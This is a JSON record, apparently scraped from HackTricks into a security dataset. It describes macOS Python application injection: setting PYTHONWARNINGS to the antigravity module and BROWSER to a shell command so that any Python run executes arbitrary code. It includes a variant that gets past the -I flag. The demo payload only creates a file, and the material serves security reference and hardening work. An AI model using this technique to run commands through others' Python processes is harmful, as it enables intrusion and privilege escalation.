{
  "id": "macos_hardening_ee626fed2331",
  "category": "macos-hardening",
  "title": "macos python applications injection",
  "description": "# macOS Python Applications Injection\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Via `PYTHONWARNINGS` and `BROWSER` env variables\n\nIt's possible to alter both environment variables to execute arbitrary code whenever python is called, for example:\n\n```bash\n# Generate example python script\necho \"print('hi')\" > /tmp/script.py\n\n# RCE which will generate file /tmp/hacktricks\nPYTHONWARNINGS=\"all:0:antigravity.x:0:0\" BROWSER=\"/bin/sh -c 'touch /tmp/hacktricks' #%s\" python3 /tmp/script.py",
  "payloads": [
    "# macOS Python Applications Injection",
    "{{#include ../../../banners/hacktricks-training.md}}",
    "## Via `PYTHONWARNINGS` and `BROWSER` env variables",
    "It's possible to alter both environment variables to execute arbitrary code whenever python is called, for example:",
    "```bash",
    "# Generate example python script",
    "echo \"print('hi')\" > /tmp/script.py",
    "# RCE which will generate file /tmp/hacktricks",
    "PYTHONWARNINGS=\"all:0:antigravity.x:0:0\" BROWSER=\"/bin/sh -c 'touch /tmp/hacktricks' #%s\" python3 /tmp/script.py",
    "# RCE which will generate file /tmp/hacktricks bypassing \"-I\" injecting \"-W\" before the script to execute",
    "BROWSER=\"/bin/sh -c 'touch /tmp/hacktricks' #%s\" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py",
    "{{#include ../../../banners/hacktricks-training.md}}"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-python-applications-injection.md"
  ]
}